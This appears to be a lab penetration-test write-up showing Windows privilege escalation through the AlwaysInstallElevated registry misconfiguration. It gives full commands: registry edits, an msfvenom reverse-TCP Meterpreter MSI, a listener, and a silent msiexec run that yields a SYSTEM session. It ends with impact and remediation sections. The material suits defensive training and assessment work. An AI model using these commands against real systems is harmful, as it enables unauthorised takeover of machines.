# Local Privilege Escalation

## Starting Privileges

Standard, non-administrative domain user session on the Windows 11 workstation (WIN11-PC), obtained during the Initial Access stage.

## Vulnerability / Misconfiguration

The `AlwaysInstallElevated` policy was enabled in both the `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER` registry hives on the Windows 11 workstation. This configuration instructs the Windows Installer service to install `.msi` packages with SYSTEM-level privileges regardless of the invoking user's actual privilege level.

## Technique

Local privilege escalation via `AlwaysInstallElevated` misconfiguration (MITRE ATT&CK T1548.002 — Abuse Elevation Control Mechanism: Bypass User Account Control).

## Attack Execution

### Step 1 — Confirm Starting Privilege Level (Meterpreter, low-priv session)

```
meterpreter > getuid
Server username: LAB\pparker

meterpreter > getprivs
```

### Step 2 — Plant the Misconfiguration (Windows 11, one-time lab setup, elevated PowerShell)

```powershell
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```

Verified:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both returned `0x1`.

### Step 3 — Generate Malicious MSI (Kali)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[INSERT KALI IP] LPORT=4445 -f msi -o evil.msi
```

### Step 4 — Second Listener (Kali)

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [INSERT KALI IP]
set LPORT 4445
run
```

### Step 5 — Upload and Execute via the Low-Privilege Session

```
meterpreter > upload evil.msi C:\\Windows\\Temp\\evil.msi
meterpreter > shell
C:\> msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

Because `AlwaysInstallElevated` was enabled, the installer executed with SYSTEM-level privileges rather than the invoking user's standard privileges.

### Step 6 — Confirm Escalation (Kali)

```
[*] Meterpreter session 2 opened

meterpreter > sessions -i 2
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Architecture : x64
```

## Result

A new session was established running as `NT AUTHORITY\SYSTEM` on the Windows 11 workstation — the highest privilege level available on the endpoint — escalated directly from the original standard domain user session.

## Evidence

[`evidence/initial-access2.png`](../evidence/intial-access2.png)

[`evidence/privilege-escalation.png`](../evidence/privilege-escalation.png)

## Security Impact

SYSTEM-level access on the endpoint removes the operating system's normal protections around credential storage (LSASS memory), security tooling, and administrative functions. This privilege level was a required precondition for the credential access stage that followed, since standard users are blocked from reading protected credential material by design.

## Remediation

- Disable `AlwaysInstallElevated` in both `HKLM` and `HKCU` via Group Policy across all endpoints.
- Ensure standard users do not hold local administrator rights by default.
- Periodically audit endpoints for common local privilege escalation misconfigurations (unquoted service paths, weak service ACLs, `AlwaysInstallElevated`, etc.) using enumeration tooling as part of routine security assessments.
- Deploy endpoint detection and response (EDR) tooling capable of flagging anomalous SYSTEM-level process creation following installer execution by a standard user.
